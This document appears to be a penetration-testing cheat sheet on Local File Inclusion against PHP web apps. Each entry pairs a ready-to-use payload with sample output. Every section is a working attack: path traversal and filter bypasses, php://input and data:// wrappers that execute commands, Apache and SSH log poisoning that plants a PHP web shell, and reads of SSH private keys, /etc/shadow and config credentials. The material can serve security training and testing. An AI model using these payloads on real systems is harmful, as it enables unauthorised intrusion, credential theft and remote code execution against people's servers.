# LOCAL FILE INCLUSION (LFI)

### Basic LFI test

```bash
http://$IP/page.php?file=../../../etc/passwd
```

> Path traversal

**Why:** Confirm LFI exists

<details>
<summary>Example Output</summary>

```
http://10.10.10.5/page.php?file=../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin
www-data:x:33:33:www-data:/var/www
admin:x:1000:1000::/home/admin:/bin/bash
(LFI CONFIRMED)
```
</details>

---

### Null byte bypass (old PHP)

```bash
http://$IP/page.php?file=../../../etc/passwd%00
```

> PHP &lt; 5.3.4

**Why:** Bypass extension append

<details>
<summary>Example Output</summary>

```
http://10.10.10.5/page.php?file=../../../etc/passwd%00

Code appends .php: include($_GET['file'] . '.php');
Null byte terminates string early in PHP < 5.3.4
Result: reads /etc/passwd instead of /etc/passwd.php
```
</details>

---

### Double encoding

```bash
http://$IP/page.php?file=%252e%252e%252f%252e%252e%252fetc/passwd
```

> Bypass basic filters

**Why:** URL encode twice

<details>
<summary>Example Output</summary>

```
http://10.10.10.5/page.php?file=%252e%252e%252f%252e%252e%252fetc/passwd

%25 = %, so %252e = %2e = .
Server decodes twice: %252e%252e%252f -> ../ 
Bypasses WAF/filter that checks for ../
```
</details>

---

### PHP wrapper - base64 read

```bash
http://$IP/page.php?file=php://filter/convert.base64-encode/resource=config.php
```

> Read PHP source code

**Why:** See credentials in config

<details>
<summary>Example Output</summary>

```
http://10.10.10.5/page.php?file=php://filter/convert.base64-encode/resource=config.php

PD9waHAKJGRiX2hvc3QgPSAnbG9jYWxob3N0JzsK...

base64 -d:
<?php
$db_host = 'localhost';
$db_user = 'admin';
$db_pass = 'SuperSecret123';
```
</details>

---

### PHP wrapper - command exec

```bash
curl http://$IP/page.php?file=php://input -d '<?php system("id"); ?>'
```

> RCE via php://input

**Why:** Direct command execution

<details>
<summary>Example Output</summary>

```
curl http://10.10.10.5/page.php?file=php://input -d '<?php system("id"); ?>'

uid=33(www-data) gid=33(www-data) groups=33(www-data)
(RCE CONFIRMED via php://input)
```
</details>

---

### PHP data wrapper

```bash
http://$IP/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id
```

> RCE via data://

**Why:** base64 of &lt;?php system($_GET['cmd']);?&gt;

<details>
<summary>Example Output</summary>

```
http://10.10.10.5/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id

base64 decodes to: <?php system($_GET['cmd']);?>
Response: uid=33(www-data)
(RCE via data:// wrapper)
```
</details>

---

### Log poisoning (Apache)

```bash
curl -A '<?php system($_GET["cmd"]); ?>' http://$IP
then: http://$IP/page.php?file=/var/log/apache2/access.log&cmd=id
```

> Inject PHP into logs, include log

**Why:** RCE via log file

<details>
<summary>Example Output</summary>

```
Step 1: curl -A '<?php system($_GET["cmd"]); ?>' http://10.10.10.5
Step 2: http://10.10.10.5/page.php?file=/var/log/apache2/access.log&cmd=id

... uid=33(www-data) gid=33(www-data) ...
(RCE via log poisoning)
```
</details>

---

### Log poisoning (SSH)

```bash
ssh '<?php system($_GET["cmd"]); ?>'@$IP
then include /var/log/auth.log
```

> Inject PHP via SSH username

**Why:** Alternative log poisoning

<details>
<summary>Example Output</summary>

```
ssh '<?php system($_GET["cmd"]); ?>'@10.10.10.5
Permission denied

But PHP code is now in /var/log/auth.log
http://10.10.10.5/page.php?file=/var/log/auth.log&cmd=id
uid=33(www-data)
(RCE via SSH log poisoning)
```
</details>

---

### Read SSH keys

```bash
http://$IP/page.php?file=../../../home/<user>/.ssh/id_rsa
```

> Steal private keys

**Why:** SSH access

<details>
<summary>Example Output</summary>

```
http://10.10.10.5/page.php?file=../../../home/admin/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA...
-----END RSA PRIVATE KEY-----

Save to file, chmod 600, ssh -i id_rsa admin@target
(LFI to SSH key = instant foothold)
```
</details>

---

### Read /etc/shadow (if root)

```bash
http://$IP/page.php?file=../../../etc/shadow
```

> Password hashes

**Why:** Crack with hashcat/john

<details>
<summary>Example Output</summary>

```
http://10.10.10.5/page.php?file=../../../etc/shadow

root:$6$abc123$LongHashHere:19000:0:99999:7:::
admin:$6$def456$AnotherHash:19000:0:99999:7:::
(Copy hashes, crack with hashcat -m 1800)
```
</details>

---

### Common files to read

```bash
/etc/passwd
/etc/shadow
/etc/hosts
/home/<user>/.bash_history
/proc/self/environ
/var/www/html/config.php
/var/www/html/.htpasswd
```

> Sensitive file targets

**Why:** Creds, users, config

<details>
<summary>Example Output</summary>

```
/etc/passwd -> usernames
/etc/shadow -> password hashes (if readable)
/home/user/.ssh/id_rsa -> SSH private key
/var/www/html/config.php -> DB credentials
/proc/self/environ -> environment variables with secrets
~/.bash_history -> command history with passwords
```
</details>

---

### Windows LFI paths

```bash
..\..\..\windows\system32\drivers\etc\hosts
..\..\..\windows\win.ini
..\..\..\inetpub\wwwroot\web.config
```

> Windows file targets

**Why:** Windows path format

<details>
<summary>Example Output</summary>

```
..\..\..\windows\system32\drivers\etc\hosts
 -> 127.0.0.1 localhost
..\..\..\inetpub\wwwroot\web.config
 -> <connectionStrings>Password=DBp@ss</connectionStrings>
..\..\..\windows\win.ini
 -> [fonts] (confirms LFI on Windows)
```
</details>

---
